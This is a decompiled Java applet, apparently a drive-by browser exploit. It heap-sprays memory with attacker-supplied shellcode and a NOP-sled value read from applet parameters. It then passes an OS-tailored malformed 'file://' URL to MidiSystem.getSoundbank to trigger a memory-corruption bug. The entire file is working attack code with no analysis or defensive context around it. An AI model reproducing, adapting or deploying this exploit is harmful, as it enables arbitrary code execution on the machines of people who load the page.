import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class AppletX extends Applet
{
    private IntBuffer[] mem;
    
    public void init() {
        repeat('/', 303);
        final String lowerCase = System.getProperty("os.name").toLowerCase();
        String s;
        if (lowerCase.indexOf("win") >= 0) {
            s = repeat('/', 302);
        }
        else if (lowerCase.indexOf("mac") >= 0) {
            s = repeat('/', 1080);
        }
        else {
            if (lowerCase.indexOf("nix") < 0 && lowerCase.indexOf("nux") < 0) {
                return;
            }
            s = repeat('/', 1337);
        }
        final String string = "file://" + s + "Z%Z%Z%Z%Z%Z%";
        try {
            this.mem = this.spray(this.getParameter("sc"), this.getParameter("np"));
            MidiSystem.getSoundbank(new URL(string));
            while (true) {
                Thread.sleep(10L);
            }
        }
        catch (Exception ex) {
            System.out.println(ex);
        }
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] spray(final String s, final String s2) {
        return this.spray(HexDecode(s), HexDecode(s2));
    }
    
    public final IntBuffer[] spray(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
}
